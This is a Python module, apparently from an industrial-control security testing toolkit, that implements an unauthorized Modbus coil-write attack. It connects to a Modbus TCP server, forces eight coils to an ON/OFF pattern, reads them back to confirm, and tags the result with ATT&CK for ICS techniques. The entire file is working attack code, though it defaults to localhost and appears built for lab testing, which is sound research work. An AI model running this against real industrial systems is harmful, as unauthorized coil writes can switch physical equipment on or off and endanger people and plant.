from pymodbus.client import ModbusTcpClient
import time
import logging
from .attack_result import AttackResult
from .validation import ModbusValidator
from .attack_mapping import get_attack_techniques

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusUnauthorizedCoilWriter:
    def __init__(self, host='localhost', port=502, unit_id=1):
        self.host = host
        self.port = port
        self.unit_id = unit_id
        self.client = None

    def connect(self):
        """Establish connection to Modbus server"""
        try:
            self.client = ModbusTcpClient(self.host, port=self.port)
            if self.client.connect():
                logger.info(f"Connected to target Modbus server at {self.host}:{self.port}")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def write_coils(self, start_addr=0, values=None, log_output=True):
        """Write coil values: First 4 ON, Last 4 OFF (default)"""
        if values is None:
            values = [True] * 4 + [False] * 4
        try:
            result = self.client.write_coils(start_addr, values, device_id=self.unit_id)
            if not result.isError():
                if log_output:
                    logger.info("Successfully wrote coil values.")
                return True
            else:
                if log_output:
                    logger.error("Failed to write coil values.")
                return False
        except Exception as e:
            if log_output:
                logger.error(f"Error writing coils: {e}")
            return False

    def read_coils(self, start_addr=0, count=8, log_output=True):
        """Read coil status (binary outputs)"""
        try:
            result = self.client.read_coils(address=start_addr, count=count, device_id=self.unit_id)
            if not result.isError():
                if log_output:
                    logger.info("Coil Status:")
                    for i, value in enumerate(result.bits[:count]):
                        status = "ON" if value else "OFF"
                        logger.info("  Coil {}: {}".format(start_addr + i, status))
                return result.bits[:count]
            return None
        except Exception as e:
            if log_output:
                logger.error(f"Failed to read coils: {e}")
            return None

    def execute(self, start=0, count=8, values=None):
        """
        Execute coil write attack and return structured result.

        Args:
            start: Starting address for coil write (default: 0)
            count: Number of coils to write (default: 8)
            values: List of boolean values to write (default: [True]*4 + [False]*4)

        Returns:
            AttackResult with write result and readback data
        """
        if values is None:
            values = [True] * 4 + [False] * 4

        # Validate parameters
        valid, msg = ModbusValidator.validate_write_operation(start, count, self.unit_id, 'write_coils')
        if not valid:
            return AttackResult(
                attack='coil',
                target={'host': self.host, 'port': self.port, 'unit_id': self.unit_id},
                params={'start': start, 'count': count},
                success=False,
                timestamp=AttackResult.create('coil', self.host, self.port, self.unit_id).timestamp,
                error=f"Validation failed: {msg}"
            )

        result = AttackResult.create(
            'coil', self.host, self.port, self.unit_id,
            params={'start': start, 'count': count, 'values': values}
        )

        try:
            if not self.connect():
                result.error = "Failed to connect to Modbus server"
                return result

            # Write coils
            write_success = self.write_coils(start, values, log_output=False)
            result.data['write_success'] = write_success

            time.sleep(0.5)  # Small delay before reading

            # Read back to verify
            coils = self.read_coils(start, count, log_output=False)
            if coils is not None:
                result.data['coils'] = {start + i: val for i, val in enumerate(coils)}

            self.client.close()
            result.success = write_success

        except Exception as e:
            result.error = str(e)
            if self.client:
                self.client.close()

        # Populate ATT&CK for ICS technique mapping
        techniques = get_attack_techniques('coil')
        if techniques:
            result.attack_technique = techniques[0] if len(techniques) == 1 else {'techniques': techniques}

        return result

    def run_test(self):
        """Write values to coils and then read them back (backward compatibility)"""
        if self.connect():
            logger.info("\nWriting values to Modbus server...")
            self.write_coils()

            time.sleep(0.5)  # Small delay before reading

            logger.info("\nReading values back...")
            self.read_coils()

            self.client.close()
        else:
            logger.error("Failed to connect to Modbus server")

if __name__ == "__main__":
    writer = ModbusUnauthorizedCoilWriter()
    writer.run_test()
